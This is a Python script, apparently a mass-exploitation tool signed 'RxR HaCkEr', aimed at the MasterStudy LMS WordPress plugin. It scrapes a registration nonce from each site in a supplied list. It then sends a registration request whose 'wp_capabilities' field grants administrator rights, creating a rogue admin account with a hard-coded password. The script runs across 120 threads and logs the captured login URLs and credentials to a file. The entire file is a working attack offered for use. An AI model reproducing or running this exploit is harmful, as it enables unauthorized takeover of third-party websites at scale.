import sys , requests, re , socket , random , string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 

init(autoreset=True)

fr  =   Fore.RED
fg  =   Fore.GREEN


requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')




headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
# Coded By RxR HaCkEr



#EmaiLs = raw_input("Entery Your EmaiL :")
#"/wp-content/plugins/masterstudy-lms-learning-management-system/"
#"stm_lms_register":"0590fa56f9"
banner = '''{}
           
______       ______   _   _         _____  _     _____           
| ___ \     | ___ \ | | | |       /  __ \| |   |  ___|         
| |_/ /__  __| |_/ / | |_| |  __ _ | /  \/| | __| |__  _ __   
|    / \ \/ /|    /  |  _  | / _` || |    | |/ /|  __|| '__|  
| |\ \ >  < | |\ \ | | | || (_| || \__/\|   < | |___| |     
\_| \_|/_/\_\\_| \_| \_| |_/ \__,_| \____/|_|\_\\____/|_|       


Coded By: RxR HaCkEr Telegram:t.me/CodeRxR , Skype:a.789a    

\n'''.format(fr)
print banner

	
def check_nonce(url):
	try:
		Agent = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'}
		Grap_strings = requests.get(url,headers=headers).content
		
		if 'stm_lms_nonces' in Grap_strings:
			get_nonce = re.findall('"stm_lms_register":"(.*?)"',Grap_strings)[0]
			return get_nonce
		else:
			return "bad"
	
	except:
		pass
			


def id_generator(size=8, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  is not '/' :
        site = site+'/'
    return site

def domain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    if 'www.' in site :
        site = site.replace("www.", "")
    site = site.rstrip()
    if site.split('/') :
        site = site.split('/')[0]
    while site[-1] == "/":
        pattern = re.compile('(.*)/')
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def addWWW(site):
    if site.startswith("http://"):
        site = site.replace("http://", "http://www.")
    elif site.startswith("https://"):
        site = site.replace("https://", "https://www.")
    else :
        site = 'http://www.'+site
    return site

def exploit(url) :
    try :
			dom = domain(url)
			url = URLdomain(url)
			if 'www.' in url:
				username = url.replace('www.', '')
			else:
				username = url
			if '.' in username:
				username = username.split('.')[0]
			if 'http://' in username:
				username = username.replace('http://', '')
			else:
				username = username.replace('https://', '')
			up=username.title()

			#if 'bad' not in Nonces:
			Nonces = check_nonce(url)
			if 'bad' not in Nonces:
				data = '{"user_login":"RxRHaCkEr","user_email":"RxRHaCkEr@gmail.com","user_password":"RxRhacker123q","user_password_re":"RxRhacker123q","become_instructor":"","privacy_policy":true,"degree":"","expertize":"","auditory":"","additional":[],"additional_instructors":[],"profile_default_fields_for_register":{"wp_capabilities":{"value":{"administrator":1}}}}'
				Agent = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36','Content-Type':'application/json'}

				#data = {"user_login":"poctestingxxxa","user_email":"akanzcx@hotmail.com","user_password":"tojanc56556xa","user_password_re":"tojanc56556xa","become_instructor":"","privacy_policy":"true","degree":"","expertize":"","auditory":"","additional":"[]","additional_instructors":"[]","profile_default_fields_for_register":{"wp_capabilities":{"value":{"administrator":1}}}}
				rg = requests.post(url + "/wp-admin/admin-ajax.php?action=stm_lms_register&nonce="+Nonces, data=data,headers=Agent).content

				if ',"status":"success"' in rg:
					print('[Target:] {} >> {}Success Added ').format(url,fg)
					open('WP_Login.txt','a').write(url + "/wp-login.php|RxRHaCkEr|RxRhacker123q"+"\n")
				else:
					print('[Target:] {} >> {}Not Vulin ').format(url,fr)
				# print('Target:{}  --> {}[Failed]').format(url,fr)
			else:
				print('Target:{}  --> {}[Failed]').format(url,fr)
    except :
       print('Target:{}  --> {}[Failed]').format(url,fr)

mp = Pool(120)
mp.map(exploit, target)
mp.close()
mp.join()
